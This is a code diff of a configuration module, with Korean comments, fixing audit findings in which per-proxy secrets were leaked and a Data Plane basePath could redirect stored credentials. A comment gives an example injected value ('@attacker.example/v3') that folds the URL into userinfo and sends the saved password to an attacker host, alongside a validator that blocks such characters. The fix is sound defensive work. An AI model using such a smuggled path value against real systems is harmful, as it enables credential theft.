@@ -82,6 +82,13 @@ export function getConfigSafe() {
     ...c,
     dataplane: { ...c.dataplane, password: c.dataplane.password ? REDACT : '' },
     deploy: { ...c.deploy, password: c.deploy.password ? REDACT : '', privateKey: c.deploy.privateKey ? REDACT : '' },
+    // ⚠ v2.503 (감사 S2, medium): `{...c}` 스프레드는 **최상위만** 가린다 — 프록시별 설정
+    // (`c.proxies[].dataplane.password` · `deploy.password` · `deploy.privateKey`)은 복호된 평문
+    // 그대로 응답에 실렸다. 형제 라우트 `/proxies/full` 은 이미 `redactProxy` 를 통과시킨다.
+    // v2.500 D/M1(relaycheck) 과 같은 원인 — '응답을 스프레드하면 뒤에 붙인 가림이 하위를 못 덮는다'.
+    // normalizeProxy 를 먼저 태운다 — 저장 파일에 dataplane/deploy 가 없는 구버전 항목이면
+    // redactProxy 가 undefined 를 참조해 던진다(listProxiesSafe 와 같은 순서).
+    proxies: Array.isArray(c.proxies) ? c.proxies.map(normalizeProxy).map(redactProxy) : [],
   };
 }
 
@@ -92,13 +99,44 @@ export function getConfigSafe() {
  * `POST /remote/proxies/:id/health` 를 부르면 저장된 Data Plane 비밀번호가 Basic 으로 그 URL 에
  * 전송됐고, deploy 쪽은 저장된 root 비번·개인키로 공격자 sshd 에 접속했다. 규칙: util/secretCarry.js.
  */
-const DP_ID_KEYS = ['url'];                          // Data Plane 은 URL 이 곧 접속처
+/**
+ * ⚠ v2.503 (감사 S2, high) — **idKeys 는 '최종 요청 URL 을 만드는 모든 필드' 여야 한다.**
+ * v2.500 은 `['url']` 만 넣었는데 실제 요청 주소는 `proxy/dataplane.js base()` 에서
+ * `url + (basePath || '/v3') + '/services/haproxy'` 로 **문자열 연결**된다. 그래서
+ * `{basePath: '@attacker.example/v3', password: '********'}` 로 저장하면 `accessMoved` 가 거짓이라
+ * 비밀번호가 승계되고, 조립된 주소는 `http://haproxy.internal:5555@attacker.example/v3/...` 가 되어
+ * **앞부분이 userinfo 로 접힌다** — 접속처가 공격자 호스트로 바뀌면서 저장된 Data Plane 비밀번호가
+ * Basic 헤더로 전송된다(`new URL(...).host === 'attacker.example'` 실측 확인).
+ * 새 스토어를 만들 때도 같은 기준으로 idKeys 를 고를 것: 호스트만이 아니라 **경로 조각·포트·계정 등
+ * 요청 대상을 바꿀 수 있는 모든 필드**가 들어간다.
+ */
+const DP_ID_KEYS = ['url', 'basePath'];              // Data Plane 접속처 = url + basePath(조립 URL 전부)
 const DEPLOY_ID_KEYS = ['host', 'port', 'username']; // SSH 배포는 호스트·포트·계정
+
+/**
+ * Data Plane `basePath` 형식 검증(v2.503). 경로 조각이어야 하며 권한부(authority)를 열 수 없다.
+ * `@`(userinfo 로 앞을 접어 호스트를 바꾼다) · `//`(스킴 상대 URL) · `?`·`#`(질의·프래그먼트) ·
+ * 공백·제어문자를 거부하고 반드시 `/` 로 시작하게 한다. 빈 값은 '미지정'(기본 `/v3`).
+ * 순수 함수 — 테스트로 고정한다.
+ */
+export function basePathIssue(v) {
+  if (v === undefined || v === null || v === '') return null;   // 미지정 = 기본값 사용
+  const s = String(v);
+  if (s.length > 120) return 'basePath 가 너무 깁니다(120자 이내).';
+  if (!s.startsWith('/')) return "basePath 는 '/' 로 시작해야 합니다.";
+  if (s.startsWith('//')) return "basePath 를 '//' 로 시작할 수 없습니다(다른 호스트를 가리킵니다).";
+  if (/[@?#\\]/.test(s)) return "basePath 에 '@' · '?' · '#' · '\\' 를 쓸 수 없습니다(요청 대상이 바뀝니다).";
+  // eslint-disable-next-line no-control-regex
+  if (/[\s\u0000-\u001f\u007f]/.test(s)) return 'basePath 에 공백·제어문자를 쓸 수 없습니다.';
+  return null;
+}
 
 export function saveConfig(partial = {}) {
   const c = load();
   if (partial.dataplane) {
     const dp = partial.dataplane;
+    const bad = basePathIssue(dp.basePath);
+    if (bad) { const e = new Error(bad); e.status = 400; throw e; }
     const moved = accessMoved(c.dataplane, dp, DP_ID_KEYS);
     if (dp.password === REDACT) delete dp.password; // keep existing when redacted placeholder sent
     c.dataplane = { ...c.dataplane, ...dp };
@@ -179,7 +217,11 @@ export function saveProxy(body = {}) {
   const base = existing || normalizeProxy({ id: crypto.randomBytes(4).toString('hex') });
   const next = { ...base };
   for (const k of ['name', 'proxyHost', 'publicPortBase', 'vcenterIds']) if (body[k] !== undefined) next[k] = body[k];
-  if (body.dataplane) next.dataplane = mergeSecrets(base.dataplane || DEFAULTS.dataplane, { ...body.dataplane }, ['password'], DP_ID_KEYS);
+  if (body.dataplane) {
+    const bad = basePathIssue(body.dataplane.basePath);
+    if (bad) return { ok: false, reason: bad };
+    next.dataplane = mergeSecrets(base.dataplane || DEFAULTS.dataplane, { ...body.dataplane }, ['password'], DP_ID_KEYS);
+  }
   if (body.deploy) next.deploy = mergeSecrets(base.deploy || DEFAULTS.deploy, { ...body.deploy }, ['password', 'privateKey'], DEPLOY_ID_KEYS);
   if (body.guacd) next.guacd = { ...(base.guacd || DEFAULTS.guacd), ...body.guacd };
   if (existing) c.proxies = c.proxies.map((p) => (p.id === existing.id ? next : p));
